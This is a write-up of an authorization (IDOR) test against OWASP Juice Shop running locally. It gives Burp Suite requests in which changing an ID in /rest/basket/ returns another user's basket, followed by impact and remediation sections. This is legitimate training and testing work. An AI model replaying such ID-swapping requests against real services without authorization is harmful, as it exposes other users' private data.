# Project 02 — Authorization / IDOR Testing

## Overview

This project focuses on testing authorization controls in OWASP Juice Shop.

The main goal was to check whether a logged-in user could access resources belonging to other users simply by changing an ID in an API request.

The testing was performed locally using Burp Suite and the OWASP Juice Shop application.

---

## Target

- **Application:** OWASP Juice Shop
- **Environment:** Localhost
- **Target:** `http://127.0.0.1:3000`
- **Testing Tool:** Burp Suite
- **Testing Type:** Authorization Testing / IDOR

---

#  Reconnaissance

The first step was to understand how the application communicates with its backend.

I browsed through different parts of the application while Burp Suite Proxy was enabled and monitored the HTTP history.

The main things I looked for were:

- API endpoints
- Object IDs in URLs
- User-specific resources
- Requests containing an `Authorization` header
- Endpoints that returned JSON data
- Resources where changing an ID could potentially access another object

During this process, several API endpoints were identified, including:

```text
/api/basket/<id>
/api/Addresses/<id>
/api/Deliveries/<id>
```

<img width="624" height="279" alt="recon" src="https://github.com/user-attachments/assets/bc158ec2-586b-43d1-834d-0a71c61a9b64" />

---

# Methodology
I used a black-box testing approach for this assessment.

I did not modify the source code of the application. Instead, I interacted with the application normally and used Burp Suite to inspect and modify the HTTP requests.
For authorization testing, my general process was:

Discover → Intercept → Identify Object ID → Modify → Replay → Compare → Document

The main tests performed were:

- Identification of API endpoints
- Testing predictable object IDs
- Changing object IDs in API requests
- Comparing responses between different IDs
- Checking whether authentication was still required
- Checking whether the server returned unauthorized objects
- Testing whether invalid IDs were properly handled

---

# Authorization Testing
**1. Identifying an Object-Based API Endpoint**

During HTTP history analysis, I found requests to the delivery API.

One of the requests was:

```text
GET /api/Deliveries/1 HTTP/1.1
Host: 127.0.0.1:3000
Authorization: Bearer <authenticated-token>
```

The request was sent while authenticated to the application.

The server returned:

```text
HTTP/1.1 200 OK
```

Response

The response contained information such as:

```http
{
  "status": "success",
  "data": {
    "id": 1,
    "name": "One Day Delivery",
    "price": 0.99,
    "eta": 1
  }
}
```

<img width="1226" height="607" alt="delivery-id-1" src="https://github.com/user-attachments/assets/8760a301-ea06-4b3f-8b35-2cbb046a69b7" />


This showed that the delivery ID was being directly used by the backend to identify the requested resource.

**2. Changing the Object ID**

After identifying the object ID, I changed the request from:

```text
GET /api/Deliveries/1
```

To

```text
GET /api/Deliveries/3
```

I kept the authenticated session/token the same and only changed the object ID.

The server responded with:

```text
HTTP/1.1 200 OK
```

and returned a different delivery object.
The response contained:

```http
{
  "status": "success",
  "data": {
    "id": 3,
    "name": "Standard Delivery",
    "price": 0,
    "eta": 5
  }
}
```
<img width="1224" height="611" alt="delivery-id-3" src="https://github.com/user-attachments/assets/ec467890-5018-41f1-a95a-fdd0ebe17dd5" />


This showed that changing the object ID resulted in a different resource being returned.

This indicates that the endpoint relies on the supplied object ID to identify the delivery resource.

However, because delivery information is not clearly tied to a particular user's private data in this test, I did not treat this alone as proof of a high-impact IDOR vulnerability.

**3. Testing Other Object IDs**

I also tested other ID-based endpoints discovered during reconnaissance.

For example:

```text
/api/Addresses/3
```

When testing an invalid or suspicious request, the application returned:

```text
HTTP/1.1 400 Bad Request
```

with the response:

```http
{
  "status": "error",
  "data": "Malicious activity detected."
}
```

<img width="1239" height="577" alt="address-id-3" src="https://github.com/user-attachments/assets/545ba629-8bd5-4f28-aaa7-d3fe43b7efd8" />


This showed that the application has additional validation or security controls for certain requests.

I therefore continued focusing on the delivery endpoint where changing the object ID resulted in a normal successful response.

---

#  Findings

## AUTHZ-01 — Insecure Direct Object Reference (IDOR) in Basket API

**Severity:** High

**Status:** Confirmed

### Description

During authorization testing, I found that the basket API did not properly verify whether the requested basket belonged to the currently authenticated user.

I was logged in as **User 24** and first accessed my own basket:

```http
GET /rest/basket/6
```

The response showed:

```http
{
  "id": 6,
  "UserId": 24
}
```

I then changed only the basket ID:

```text
GET /rest/basket/1
```

The authentication token remained unchanged.

The application returned:

```text
HTTP/1.1 200 OK
```

and the response showed:

```http
{
  "id": 1,
  "UserId": 1
}
```

This demonstrated that User 24 could access a basket belonging to User 1.

**Proof of Concept**

Step 1 — Access my own basket

```text
GET /rest/basket/6 HTTP/1.1
Authorization: Bearer <authenticated-token>
```

Response:

```http
{
  "id": 6,
  "UserId": 24
}
```

<img width="1229" height="616" alt="basket-id-6" src="https://github.com/user-attachments/assets/78c308b9-b91a-4ba4-b962-b218d80b1ad4" />

This established the baseline and confirmed that basket 6 belonged to my authenticated account.

Step 2 — Change the basket ID

```text
GET /rest/basket/1 HTTP/1.1
Authorization: Bearer <same-authenticated-token>
```

The response contained:

```http
{
  "id": 1,
  "UserId": 1
}
```

<img width="1230" height="609" alt="basket-id-1" src="https://github.com/user-attachments/assets/9f018509-b21d-49ba-a17f-85a1a8438372" />


The important point is that I was still authenticated as User 24, but the application returned a basket belonging to User 1

This confirms a horizontal authorization issue / IDOR.

---

# Impact

An authenticated attacker could potentially access other users' basket information by modifying the basket ID.

Depending on the information stored in the basket, this could expose:
- Products in another user's basket
- Basket information
- User-associated shopping data
- Potentially other information if similar authorization weaknesses exist elsewhere
- 
If corresponding write operations are also vulnerable, the impact could be greater because an attacker might be able to modify another user's basket.

---

# Remediation

The application should perform a server-side authorization check before returning a basket.

The backend should:
- Identify the authenticated user.
- Retrieve the requested basket.
- Check whether the basket belongs to that user.
- Deny access if ownership does not match.

---
